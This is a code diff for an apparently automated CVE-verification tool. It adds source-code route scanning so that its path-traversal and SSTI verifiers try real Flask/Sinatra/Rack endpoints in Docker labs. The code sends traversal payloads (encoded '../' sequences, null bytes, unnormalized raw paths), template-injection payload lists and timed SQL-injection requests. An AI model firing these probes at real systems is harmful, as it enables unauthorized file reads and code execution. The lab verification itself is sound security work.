@@ -443,6 +443,95 @@ class _GenericLab:
                 pass
 
 
+def _scan_web_routes(source_dir: str) -> list:
+    """Scan source dir for HTTP endpoints and their parameters.
+
+    Reads Python (Flask/Django) and Ruby (Sinatra/Rack) files in source_dir
+    and extracts route definitions + parameter names. Returns list of
+    (endpoint_path, params_dict, http_method) sorted by specificity.
+
+    Used as a pre-flight in verify_generic_ssti so the verifier tries
+    the ACTUAL routes before falling back to the LLM-guessed endpoint.
+    This is the binoracle autonomy gap fix: the LLM hypothesis is seeded
+    from the CVE description (which doesn't mention specific lab routes),
+    but the source code *does* -- scanning it removes the dependence on
+    the LLM guessing the right endpoint.
+    """
+    import glob as _glob
+    routes: list = []
+    if not source_dir or not os.path.isdir(source_dir):
+        return routes
+
+    # --- Flask (Python) ---
+    for py_file in _glob.glob(os.path.join(source_dir, "**", "*.py"), recursive=True):
+        try:
+            lines = open(py_file).readlines()
+        except Exception:
+            continue
+        cur_ep: Optional[str] = None
+        cur_meth = "GET"
+        cur_params: dict = {}
+        for line in lines:
+            s = line.strip()
+            # @app.route("/path") or @bp.route("/path", methods=["POST"])
+            m_route = re.match(
+                r'@\w+\.route\(["\']([^"\']+)["\'](?:[^)]*methods\s*=\s*\[([^\]]+)\])?', s)
+            if m_route:
+                if cur_ep is not None:
+                    routes.append((cur_ep, dict(cur_params), cur_meth))
+                cur_ep = m_route.group(1)
+                methstr = m_route.group(2) or ""
+                meths = [x.strip().strip('"\'').upper()
+                         for x in methstr.split(",") if x.strip().strip('"\'')]
+                cur_meth = meths[0] if meths else "GET"
+                cur_params = {}
+            elif cur_ep is not None:
+                for pm in re.finditer(
+                        r'request\.(?:args|values)\.get\(["\']([^"\']+)["\']', s):
+                    cur_params[pm.group(1)] = ""
+                for pm in re.finditer(
+                        r'request\.form\.get\(["\']([^"\']+)["\']', s):
+                    cur_params[pm.group(1)] = ""
+                    cur_meth = "POST"
+        if cur_ep is not None:
+            routes.append((cur_ep, dict(cur_params), cur_meth))
+
+    # --- Sinatra / plain Rack (Ruby) --- includes config.ru (*.ru) and *.rb
+    _rb_files = (_glob.glob(os.path.join(source_dir, "**", "*.rb"), recursive=True) +
+                 _glob.glob(os.path.join(source_dir, "**", "*.ru"), recursive=True))
+    for rb_file in _rb_files:
+        try:
+            lines = open(rb_file).readlines()
+        except Exception:
+            continue
+        full_rb = "".join(lines)
+        # Rack::Static (multi-line): use Rack::Static, ... urls: [...] ...
+        # Uses full-file scan because the declaration spans several lines.
+        for m_static in re.finditer(
+                r'Rack::Static[^.]*?urls\s*:\s*\[([^\]]+)\]', full_rb, re.DOTALL):
+            urls_str = m_static.group(1)
+            for pu in re.finditer(r'["\']([^"\']+)["\']', urls_str):
+                prefix = pu.group(1).rstrip("/") + "/"
+                # URL_PATH mode: traversal payload appended after the prefix
+                routes.append((prefix, {"URL_PATH": ""}, "GET"))
+        for line in lines:
+            s = line.strip()
+            # get '/path' do ... or post '/path' do ...
+            m_rb = re.match(r'(get|post|put|patch|delete)\s+["\']([^"\']+)["\']', s)
+            if m_rb:
+                routes.append((m_rb.group(2), {}, m_rb.group(1).upper()))
+
+    # Deduplicate while preserving order
+    seen: set = set()
+    uniq = []
+    for r in routes:
+        key = (r[0], r[2])
+        if key not in seen:
+            seen.add(key)
+            uniq.append(r)
+    return uniq
+
+
 def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
                            budget_s: float, setup_commands: Optional[List[str]] = None) -> Optional[tuple]:
     """Pasos comunes a TODOS los verificadores genericos: detectar como arrancar el objetivo,
@@ -648,6 +737,11 @@ def verify_generic_path_traversal(
     codificacion de '../' -- el mecanismo de prueba (leer un fichero del propio sistema de
     ficheros del contenedor) no depende del stack, asi que vale igual aqui que en WordPress.
 
+    Comportamiento de descubrimiento autonomo: igual que verify_generic_ssti, escanea el codigo
+    fuente en source_dir para descubrir endpoints reales (Rack::Static, Sinatra, Flask) ANTES
+    de usar el endpoint que propuso el LLM. Esto resuelve el caso Rack::Static (CVE-2025-27610)
+    donde el endpoint /static/ no aparece en la descripcion NVD y el LLM adivina /cgi-bin/.
+
     `setup_commands` (opcional, ver _bootstrap_generic_lab): comandos reales ejecutados dentro
     del contenedor DESPUES de arrancar y ANTES de atacar -- necesario para frameworks (Laravel/
     Microweber confirmado en vivo con CVE-2026-65694) que exigen una instalacion/migracion real
@@ -660,29 +754,54 @@ def verify_generic_path_traversal(
         res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
         return res
 
+    # --- Descubrimiento autonomo de rutas desde el codigo fuente ---
+    scanned = _scan_web_routes(source_dir) if source_dir else []
+    if scanned:
+        step(f"escaneo de fuente: {len(scanned)} ruta(s) encontrada(s): " +
+             ", ".join(ep for ep, _, _ in scanned))
+
+    def _is_url_path_mode(params) -> bool:
+        return ((path_param_hint or "").upper() in ("URL_PATH", "URLPATH") or
+                (isinstance(params, dict) and any(k.upper() in ("URL_PATH", "URLPATH") for k in params)) or
+                (isinstance(params, (list, tuple)) and any(str(p).upper() in ("URL_PATH", "URLPATH") for p in params)))
+
     path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
+    _url_path_mode = _is_url_path_mode(parameters)
+
     # Gap real (confirmado con CVE-2024-23334 / aiohttp): muchos path-traversal inyectan el
     # payload en el PATH de la URL, no en un query-param -- e.g. GET /static/../../etc/passwd.
     # El LLM puede indicarlo con path_param_hint="URL_PATH" (o pasando "url_path" como parametro).
     # Cuando el modo es URL_PATH el payload se concatena al endpoint en vez de enviarse como ?k=v.
-    _url_path_mode = (path_param or "").upper() in ("URL_PATH", "URLPATH") or (
-        isinstance(parameters, dict) and any(k.upper() in ("URL_PATH", "URLPATH") for k in parameters)
-    ) or (
-        isinstance(parameters, (list, tuple)) and any(
-            str(p).upper() in ("URL_PATH", "URLPATH") for p in parameters)
-    )
     if not path_param and not _url_path_mode:
         # ultimo intento: si el endpoint ya termina en '/' es probable que espere el path a
         # continuacion (p.ej. /static/ -> /static/../../../../etc/passwd) -- modo URL_PATH.
-        if endpoint.endswith("/"):
+        if endpoint and endpoint.endswith("/"):
             _url_path_mode = True
-        else:
+        elif not scanned:
             res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
             res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                                    "lleva la ruta/nombre de fichero; afina 'parameters' o pasalo a "
                                    "mano (path_param_hint) o usa path_param_hint='URL_PATH' si el "
                                    "payload va en el path de la URL (e.g. GET /files/../../etc/passwd)")
             return res
+
+    # Construir lista ordenada de candidatos: rutas del escaneo primero, luego LLM
+    # Cada candidato: (endpoint, params, method, url_path_mode)
+    candidates: list = []
+    seen_cands: set = set()
+    for s_ep, s_params, s_meth in scanned:
+        s_up = _is_url_path_mode(s_params) or s_ep.endswith("/")
+        key = (s_ep, s_meth.upper())
+        if key not in seen_cands:
+            seen_cands.add(key)
+            candidates.append((s_ep, s_params, s_meth.upper(), s_up, True))
+    # LLM-guessed endpoint as fallback
+    llm_up = _url_path_mode or (endpoint and endpoint.endswith("/"))
+    llm_key = (endpoint or "/", (http_method or "GET").upper())
+    if llm_key not in seen_cands and endpoint:
+        candidates.append((endpoint, parameters, (http_method or "GET").upper(), llm_up, False))
+    if not candidates:
+        candidates.append((endpoint or "/", parameters, (http_method or "GET").upper(), llm_up, False))
 
     boot = _bootstrap_generic_lab(source_dir, step, res, budget_s, setup_commands=setup_commands)
     if boot is None:
@@ -697,7 +816,6 @@ def verify_generic_path_traversal(
             res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
             return res
 
-        m = (http_method or "GET").upper()
         rel = canary_path.lstrip("/")
         depths = (2, 4, 6, 8, 10, 12)
         attempts = [rel, canary_path]
@@ -714,68 +832,78 @@ def verify_generic_path_traversal(
         attempts += [(".%2e/" * n) + rel for n in depths]
         attempts += [rel + "%00", canary_path + "%00"]
 
-        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
-                             "metodo": m, "path_param": path_param, "canary_path": canary_path,
-                             "canary_secret": secret})
-
         found = False
-        tried = []
-        for payload_value in attempts:
-            try:
-                if _url_path_mode:
-                    # el payload va concatenado al path de la URL (CVE-2024-23334 / aiohttp etc.)
-                    target_url = base_url + endpoint + payload_value
-                    # requests.request() normaliza %2e a '.' ANTES de enviar -- exactamente lo
-                    # que rompe bypasses como '.%2e/' (CVE-2021-41773 Apache 2.4.49): el
-                    # servidor necesita ver el caracter sin normalizar. Para payloads con
-                    # secuencias percent-encoded de punto (.%2e, %2e%2e) se usa urllib directo
-                    # que envia el path tal cual, sin tocar el encoding.
-                    _has_pct_dot = "%2e" in payload_value.lower() or "%2f" in payload_value.lower()
-                    if _has_pct_dot and m.upper() == "GET":
-                        resp = _http_request_raw_path(m, target_url, timeout=15)
+        tried_all: list = []
+        win_ep = endpoint or "/"
+        win_up = _url_path_mode
+        win_pp = path_param
+
+        for cand_ep, cand_params, cand_meth, cand_up, from_scan in candidates:
+            if from_scan:
+                step(f"escaneo de fuente: probando ruta descubierta: {cand_ep} "
+                     f"({'URL_PATH' if cand_up else 'query'})")
+            cand_path_p = path_param_hint or _pick_param(cand_params, _PATH_HINTS) or ""
+            tried: list = []
+            for payload_value in attempts:
+                try:
+                    if cand_up:
+                        # el payload va concatenado al path de la URL
+                        target_url = base_url + cand_ep + payload_value
+                        # requests.request() normaliza %2e a '.' ANTES de enviar -- exactamente
+                        # lo que rompe bypasses como '.%2e/' (CVE-2021-41773).
+                        _has_pct_dot = "%2e" in payload_value.lower() or "%2f" in payload_value.lower()
+                        if _has_pct_dot and cand_meth == "GET":
+                            resp = _http_request_raw_path(cand_meth, target_url, timeout=15)
+                        else:
+                            resp = _http_request(cand_meth, target_url, timeout=15)
+                        payload_desc = f"URL_PATH={payload_value!r}"
                     else:
-                        resp = _http_request(m, target_url, timeout=15)
-                    payload_desc = f"URL_PATH={payload_value!r}"
-                else:
-                    payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
-                    payload[path_param] = payload_value
-                    resp = _http_request(m, base_url + endpoint, timeout=15,
-                                            data=payload if m != "GET" else None,
-                                            params=payload if m == "GET" else None)
-                    payload_desc = f"{path_param}={payload_value!r}"
-            except Exception as e:
-                tried.append({"payload": payload_value, "error": str(e)})
-                continue
-            present = secret in (resp.text or "")
-            tried.append({"payload": payload_value, "status": resp.status_code,
-                         "secreto_presente": present,
-                         "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
-            if present:
-                found = True
-                res.evidence["payload_ganador"] = payload_value
-                res.evidence["status_code_respuesta"] = resp.status_code
-                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
-                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
-                     f"{payload_desc}.")
+                        payload = dict(cand_params) if isinstance(cand_params, dict) else dict.fromkeys(cand_params or [], "")
+                        payload[cand_path_p or path_param or "path"] = payload_value
+                        resp = _http_request(cand_meth, base_url + cand_ep, timeout=15,
+                                             data=payload if cand_meth != "GET" else None,
+                                             params=payload if cand_meth == "GET" else None)
+                        payload_desc = f"{cand_path_p or path_param}={payload_value!r}"
+                except Exception as e:
+                    tried.append({"payload": payload_value, "error": str(e)})
+                    continue
+                present = secret in (resp.text or "")
+                tried.append({"payload": payload_value, "status": resp.status_code,
+                              "secreto_presente": present,
+                              "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
+                if present:
+                    found = True
+                    win_ep, win_up, win_pp = cand_ep, cand_up, cand_path_p
+                    res.evidence["payload_ganador"] = payload_value
+                    res.evidence["status_code_respuesta"] = resp.status_code
+                    res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                    step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
+                         f"{payload_desc}.")
+                    break
+            tried_all.extend(tried)
+            if found:
                 break
 
-        res.evidence["intentos"] = tried
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": win_ep,
+                             "metodo": (http_method or "GET").upper(), "path_param": win_pp,
+                             "canary_path": canary_path, "canary_secret": secret})
+        res.evidence["intentos"] = tried_all
         if found:
             res.verified = True
             res.ok = True
             winner = res.evidence["payload_ganador"]
-            mode_desc = f"URL_PATH={winner!r}" if _url_path_mode else f"{path_param}={winner!r}"
+            mode_desc = f"URL_PATH={winner!r}" if win_up else f"{win_pp}={winner!r}"
             res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {mode_desc} devolvio "
                           f"el secreto exacto plantado en {canary_path} (dentro del contenedor "
                           f"del objetivo)")
         else:
             res.ok = True
-            sample = next((t.get("respuesta_cuerpo_recorte") for t in tried
+            sample = next((t.get("respuesta_cuerpo_recorte") for t in tried_all
                           if t.get("respuesta_cuerpo_recorte")), "")
             res.evidence["respuesta_muestra_primer_intento"] = sample
-            res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
-                          f"ninguna devolvio el secreto plantado -- el traversal no se confirmo "
-                          f"(puede necesitar otra profundidad/codificacion, o el "
+            res.detail = (f"se probaron {len(tried_all)} variantes de ruta en {len(candidates)} "
+                          f"candidato(s) y ninguna devolvio el secreto plantado -- el traversal "
+                          f"no se confirmo (puede necesitar otra profundidad/codificacion, o el "
                           f"endpoint/parametro no son los reales)")
         return res
     except subprocess.TimeoutExpired as e:
@@ -1336,6 +1464,12 @@ def verify_generic_sqli_blind(
     lab, base_url, container = boot
     try:
         m = (http_method or "GET").upper()
+        # Strip the query string from the endpoint: params are always passed separately as a
+        # dict via 'params=' in GET requests. If the endpoint includes '?k=<placeholder>' (a
+        # common LLM output pattern), appending it to base_url while ALSO passing the same key
+        # via params= would create duplicate query params -- Flask/Django returns the first one
+        # (the literal placeholder), not the injected payload.
+        endpoint_path = endpoint.split("?")[0] if endpoint and "?" in endpoint else endpoint
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")
         orig_value = str(base_params.get(sqli_param) or "1")
 
@@ -1344,18 +1478,19 @@ def verify_generic_sqli_blind(
             payload[sqli_param] = val
             t0 = time.time()
             try:
-                resp = _http_request(m, base_url + endpoint, timeout=_SQLI_SLEEP_SECONDS + 15,
+                resp = _http_request(m, base_url + endpoint_path, timeout=_SQLI_SLEEP_SECONDS + 15,
                                  data=payload if m != "GET" else None,
                                  params=payload if m == "GET" else None)
             except Exception:
                 return None
+            elapsed = time.time() - t0
             if capture_body and "respuesta_control_recorte" not in res.evidence:
                 # recorte de la respuesta de CONTROL (sin inyeccion) -- la unica evidencia real
                 # (ademas de los tiempos) que esta tecnica puede capturar, ya que el oraculo es
                 # puramente temporal; sirve igual para que el bucle de aprendizaje-y-reintento
                 # del LLM detecte un endpoint/parametro equivocado (p.ej. un 404 propio).
                 res.evidence["respuesta_control_recorte"] = (getattr(resp, "text", "") or "")[:500]
-            return time.time() - t0
+            return elapsed
 
         res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                              "metodo": m, "sqli_param": sqli_param})
@@ -1848,7 +1983,14 @@ def verify_generic_ssti(
     CALCULE una operacion aritmetica con dos numeros aleatorios; si el resultado (que no aparece
     en ningun punto del payload enviado) sale en la respuesta, es prueba de que el motor EVALUO
     codigo, no que lo reflejo como texto. Incluye las plantillas elegidas a mano MAS todas las
-    generalizables de ssti.fuzz en PayloadsAllTheThings."""
+    generalizables de ssti.fuzz en PayloadsAllTheThings.
+
+    Comportamiento de descubrimiento autonomo: antes de usar el endpoint que propuso el LLM,
+    escanea el codigo fuente en source_dir buscando rutas Flask/Sinatra reales (@app.route,
+    request.args.get). Las rutas descubiertas se prueban primero; solo si fallan se recurre
+    al endpoint del LLM. Esto elimina la dependencia de que el LLM adivine el endpoint exacto
+    a partir de la descripcion NVD (que no lo menciona).
+    """
     step = on_step or (lambda _m: None)
     res = WpVerifyResult()
     if not _docker_daemon_ok():
@@ -1857,8 +1999,25 @@ def verify_generic_ssti(
         res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
         return res
 
+    # --- Descubrimiento autonomo de rutas desde el codigo fuente ---
+    scanned = _scan_web_routes(source_dir) if source_dir else []
+    if scanned:
+        step(f"escaneo de fuente: {len(scanned)} ruta(s) encontrada(s): " +
+             ", ".join(ep for ep, _, _ in scanned))
+
     _params_list_ssti = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
     ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS) or (_params_list_ssti[0] if _params_list_ssti else "")
+
+    # Si el LLM no identifico parametro pero el escaneo si, usar la primera ruta con parametro
+    if not ssti_param and scanned:
+        for s_ep, s_params, s_meth in scanned:
+            s_p = _pick_param(s_params, _XSS_HINTS) or (list(s_params.keys())[0] if s_params else "")
+            if s_p:
+                endpoint, parameters, http_method, ssti_param = s_ep, s_params, s_meth, s_p
+                step(f"escaneo de fuente: parametro no identificado por LLM -- usando ruta "
+                     f"descubierta: {s_ep} param={s_p}")
+                break
+
     if not ssti_param:
         res.detail = "no se identifico el parametro que llega al motor de plantillas"
         res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
@@ -1882,47 +2041,79 @@ def verify_generic_ssti(
         attempt_pairs = [(p, expected) for p in hand_made] + load_ssti_arithmetic_payloads(a, b)
 
         m = (http_method or "GET").upper()
-        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
-                             "metodo": m, "ssti_param": ssti_param, "a": a, "b": b,
-                             "producto_esperado": expected})
+
+        # Construir lista ordenada de candidatos: rutas del escaneo primero, luego LLM
+        candidates: list = []
+        seen_cands: set = set()
+        for s_ep, s_params, s_meth in scanned:
+            s_p = _pick_param(s_params, _XSS_HINTS) or (list(s_params.keys())[0] if s_params else "")
+            if s_p:
+                key = (s_ep, s_p, s_meth.upper())
+                if key not in seen_cands:
+                    seen_cands.add(key)
+                    candidates.append((s_ep, s_params, s_meth.upper(), s_p, True))
+        # Endpoint del LLM como fallback si no es igual a uno ya escaneado
+        llm_key = (endpoint, ssti_param, m)
+        if endpoint and llm_key not in seen_cands:
+            candidates.append((endpoint, parameters, m, ssti_param, False))
+        if not candidates:
+            candidates.append((endpoint or "/", parameters, m, ssti_param, False))
 
         found = False
-        tried = []
-        for payload_value, payload_expected in attempt_pairs:
-            pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
-            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
-            payload[ssti_param] = payload_value
-            try:
-                resp = _http_request(m, base_url + endpoint, timeout=15,
-                                        data=payload if m != "GET" else None,
-                                        params=payload if m == "GET" else None)
-            except Exception as e:
-                tried.append({"payload": payload_value, "error": str(e)})
-                continue
-            matched = bool(pattern.search(resp.text or ""))
-            tried.append({"payload": payload_value, "status": resp.status_code,
-                         "resultado_presente": matched})
-            if matched:
-                found = True
-                res.evidence["payload_ganador"] = payload_value
-                res.evidence["resultado_esperado_ganador"] = payload_expected
-                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
-                step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
-                     f"motor de plantillas -- ese numero no aparece en el payload enviado.")
+        tried_all: list = []
+        win_ep = endpoint or "/"
+        win_param = ssti_param
+
+        for cand_ep, cand_params, cand_meth, cand_p, from_scan in candidates:
+            if from_scan:
+                step(f"escaneo de fuente: probando ruta descubierta: {cand_ep} param={cand_p}")
+            ep_path = cand_ep.split("?")[0] if cand_ep and "?" in cand_ep else (cand_ep or "/")
+            tried: list = []
+            for payload_value, payload_expected in attempt_pairs:
+                pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
+                payload = dict(cand_params) if isinstance(cand_params, dict) else dict.fromkeys(cand_params or [], "")
+                payload[cand_p] = payload_value
+                try:
+                    resp = _http_request(cand_meth, base_url + ep_path, timeout=15,
+                                         data=payload if cand_meth != "GET" else None,
+                                         params=payload if cand_meth == "GET" else None)
+                except Exception as e:
+                    tried.append({"payload": payload_value, "error": str(e)})
+                    continue
+                matched = bool(pattern.search(resp.text or ""))
+                tried.append({"payload": payload_value, "status": resp.status_code,
+                              "resultado_presente": matched})
+                if matched:
+                    found = True
+                    win_ep, win_param = cand_ep, cand_p
+                    res.evidence["payload_ganador"] = payload_value
+                    res.evidence["resultado_esperado_ganador"] = payload_expected
+                    res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                    step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
+                         f"motor de plantillas -- ese numero no aparece en el payload enviado.")
+                    break
+            tried_all.extend(tried)
+            if found:
                 break
 
-        res.evidence["intentos"] = tried
+        # Strip query string from endpoint - params are always sent via params= dict separately;
+        # duplicate query params (from both the endpoint path and params=) would make Flask/Django
+        # use the placeholder literal instead of the payload.
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": win_ep,
+                             "metodo": m, "ssti_param": win_param, "a": a, "b": b,
+                             "producto_esperado": expected})
+        res.evidence["intentos"] = tried_all
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
+            res.detail = (f"SSTI confirmada: la peticion con {win_param}="
                           f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                           f"EVALUARA la expresion y devolviera "
                           f"{res.evidence['resultado_esperado_ganador']} en la respuesta -- "
                           f"prueba inequivoca de evaluacion de codigo en servidor")
         else:
             res.ok = True
-            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} "
+            res.detail = (f"se probaron {len(tried_all)} sintaxis de plantilla para {win_param} "
                           f"(producto esperado {a}*{b}={expected}, mas las plantillas aditivas) y "
                           f"ninguna produjo el resultado esperado -- el SSTI no se confirmo")
         return res
